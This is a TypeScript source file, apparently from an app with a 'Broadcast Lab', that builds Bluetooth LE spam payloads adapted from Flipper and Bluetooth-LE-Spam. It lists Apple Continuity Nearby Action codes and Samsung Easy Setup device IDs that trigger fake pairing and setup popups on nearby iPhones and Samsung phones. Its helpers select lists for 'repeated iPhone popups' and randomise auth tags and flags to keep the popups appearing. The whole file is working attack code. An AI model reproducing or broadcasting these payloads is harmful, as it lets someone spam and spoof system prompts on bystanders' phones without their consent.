export type BleProfileBase = {
  id: string;
  label: string;
  /** Shown in Broadcast Lab: who might see a popup */
  targets: string;
  payload: number[];
  /** Optional Samsung Easy Setup scan-response manufacturer bytes */
  scanResponsePayload?: number[];
};

export type ManufacturerProfile = BleProfileBase & {
  kind: 'manufacturer';
  companyId: number;
  /**
   * continuity-nearby-action: rebuild payload with fresh random auth tag at broadcast time
   * static: send payload as-is
   */
  advertiseMode: 'continuity-nearby-action' | 'static';
  /** Nearby Action type byte (only for continuity-nearby-action) */
  actionByte?: number;
};

export type ServiceProfile = BleProfileBase & {
  kind: 'service';
  serviceId: number;
};

export type BleProfile = ManufacturerProfile | ServiceProfile;

/** Apple Continuity Nearby Action (type 0x0F) — 7 bytes after company ID. Auth tag filled at broadcast. */
function nearbyActionTemplate(action: number): number[] {
  return [0x0f, 0x05, 0xc0, action, 0x00, 0x00, 0x00];
}

/**
 * Samsung Easy Setup Buds template from Flipper / Bluetooth-LE-Spam.
 * deviceIdHex = 6 hex chars (e.g. "EE7A0C") → inserted as AABB 01 CC
 */
function samsungBudsPayload(deviceIdHex: string): number[] {
  const prepend = [0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09];
  const append = [0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00];
  const mid = [
    parseInt(deviceIdHex.slice(0, 2), 16),
    parseInt(deviceIdHex.slice(2, 4), 16),
    0x01,
    parseInt(deviceIdHex.slice(4, 6), 16),
  ];
  return [...prepend, ...mid, ...append];
}

const SAMSUNG_SCAN_RESPONSE = [
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

const SAMSUNG_BUDS: Array<{ id: string; label: string; deviceId: string }> = [
  { id: 'samsung-fallback-buds', label: 'Samsung Fallback Buds', deviceId: 'EE7A0C' },
  { id: 'samsung-fallback-dots', label: 'Samsung Fallback Dots', deviceId: '9D1700' },
  { id: 'samsung-buds2-purple', label: 'Samsung Buds2 (Light Purple)', deviceId: '39EA48' },
  { id: 'samsung-buds2-silver', label: 'Samsung Buds2 (Bluish Silver)', deviceId: 'A7C62C' },
  { id: 'samsung-buds-live-black', label: 'Samsung Buds Live (Black)', deviceId: '850116' },
  { id: 'samsung-buds2-gray-black', label: 'Samsung Buds2 (Gray & Black)', deviceId: '3D8F41' },
  { id: 'samsung-buds-white', label: 'Samsung Pure White Buds', deviceId: 'B8B905' },
  { id: 'samsung-buds2-white', label: 'Samsung Pure White Buds2', deviceId: 'EAAA17' },
  { id: 'samsung-buds-black', label: 'Samsung Black Buds', deviceId: 'D30704' },
  { id: 'samsung-buds-pink', label: 'Samsung Pink Buds', deviceId: '8E4503' },
];

const APPLE_NEARBY_ACTIONS: Array<{ id: string; label: string; action: number }> = [
  { id: 'apple-setup-iphone', label: 'Apple: Setup New iPhone', action: 0x09 },
  { id: 'apple-setup-appletv', label: 'Apple: Setup New AppleTV', action: 0x01 },
  { id: 'apple-pair-appletv', label: 'Apple: Pair AppleTV', action: 0x06 },
  { id: 'apple-join-appletv', label: 'Apple: Join This AppleTV?', action: 0x20 },
  { id: 'apple-watch', label: 'Apple: Apple Watch', action: 0x05 },
  { id: 'apple-homepod', label: 'Apple: HomePod Setup', action: 0x0b },
  { id: 'apple-transfer-number', label: 'Apple: Transfer Phone Number', action: 0x02 },
  { id: 'apple-vision-pro', label: 'Apple: Apple Vision Pro', action: 0x24 },
  { id: 'apple-software-update', label: 'Apple: Software Update', action: 0x21 },
];

export const BLE_PROFILES: BleProfile[] = [
  ...APPLE_NEARBY_ACTIONS.map(
    (a): ManufacturerProfile => ({
      id: a.id,
      label: a.label,
      targets: 'iPhone / iPad',
      kind: 'manufacturer',
      companyId: 0x004c,
      advertiseMode: 'continuity-nearby-action',
      actionByte: a.action,
      payload: nearbyActionTemplate(a.action),
    })
  ),
  ...SAMSUNG_BUDS.map(
    (b): ManufacturerProfile => ({
      id: b.id,
      label: b.label,
      targets: 'Samsung phones',
      kind: 'manufacturer',
      companyId: 0x0075,
      advertiseMode: 'static',
      payload: samsungBudsPayload(b.deviceId),
      scanResponsePayload: SAMSUNG_SCAN_RESPONSE,
    })
  ),
  // Kept for Scan decode / study; Broadcast Lab prefers Nearby Action (fits 31 bytes).
  {
    id: 'airpods-pro',
    label: 'AirPods Pro (Proximity Pair — study only)',
    targets: 'iPhone (often rate-limited; long packet)',
    kind: 'manufacturer',
    companyId: 0x004c,
    advertiseMode: 'static',
    // Truncated-safe study payload is too long for reliable legacy ads; mark via label.
    // Use SpeastTV-style shorter-ish status bytes but still near the limit — Broadcast filters these out.
    payload: [
      0x07, 0x19, 0x01, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ],
  },
  {
    id: 'sony-xm5',
    label: 'Sony XM5 (Fast Pair — often patched)',
    targets: 'Android (often patched)',
    kind: 'service',
    serviceId: 0xfe2c,
    payload: [0xd4, 0x46, 0xa7],
  },
];

/** Profiles the Broadcast Lab can actually send with manufacturer-only ads. */
export function getBroadcastableProfiles(): ManufacturerProfile[] {
  return BLE_PROFILES.filter(
    (p): p is ManufacturerProfile =>
      p.kind === 'manufacturer' &&
      (p.advertiseMode === 'continuity-nearby-action' ||
        (p.advertiseMode === 'static' && p.companyId === 0x0075))
  );
}

/** Apple Nearby Action only — best list for repeated iPhone popups. */
export function getAppleNearbyProfiles(): ManufacturerProfile[] {
  return BLE_PROFILES.filter(
    (p): p is ManufacturerProfile =>
      p.kind === 'manufacturer' && p.advertiseMode === 'continuity-nearby-action'
  );
}

/** Samsung Easy Setup only. */
export function getSamsungProfiles(): ManufacturerProfile[] {
  return BLE_PROFILES.filter(
    (p): p is ManufacturerProfile =>
      p.kind === 'manufacturer' &&
      p.advertiseMode === 'static' &&
      p.companyId === 0x0075
  );
}

/**
 * Build the exact manufacturer payload to put on the air.
 * Nearby Action: random auth tag + flag variants (same trick Bluetooth-LE-Spam uses).
 */
export function buildAdvertisePayload(profile: ManufacturerProfile): number[] {
  if (profile.advertiseMode === 'continuity-nearby-action') {
    const action = profile.actionByte ?? profile.payload[3] ?? 0x09;
    let flag = 0xc0;
    // Flag jitter from Bluetooth-LE-Spam ContinuityActionModalAdvertisementSetGenerator
    if (action === 0x20 && Math.random() < 0.5) flag = 0xbf;
    if (action === 0x09 && Math.random() < 0.5) flag = 0x40;
    if (action === 0x21) flag = 0x40;

    return [
      0x0f,
      0x05,
      flag,
      action,
      Math.floor(Math.random() * 256),
      Math.floor(Math.random() * 256),
      Math.floor(Math.random() * 256),
    ];
  }
  return profile.payload;
}
